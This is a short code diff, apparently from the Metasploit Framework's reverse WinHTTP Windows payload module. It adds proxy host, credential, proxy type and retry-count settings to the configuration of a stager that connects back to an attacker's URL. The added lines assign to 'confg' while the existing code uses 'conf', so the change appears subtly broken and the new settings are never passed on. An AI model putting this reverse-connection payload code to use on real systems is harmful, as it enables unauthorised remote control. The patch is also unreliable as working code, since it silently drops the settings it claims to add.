@@ -36,6 +36,11 @@ module Payload::Windows::ReverseWinHttp
       conf[:url]              = generate_uri
       conf[:exitfunk]         = datastore['EXITFUNC']
       conf[:verify_cert_hash] = opts[:verify_cert_hash]
+      confg[:proxy_host]      = datastore['PayloadProxyHost']
+      confg[:proxy_user]      = datastore['PayloadProxyUser']
+      confg[:proxy_pass]      = datastore['PayloadProxyPass']
+      confg[:proxy_type]      = datastore['PayloadProxyType']
+      confg[:retry_count]     = datastore['StagerRetryCount']
     end
 
     generate_reverse_winhttp(conf)
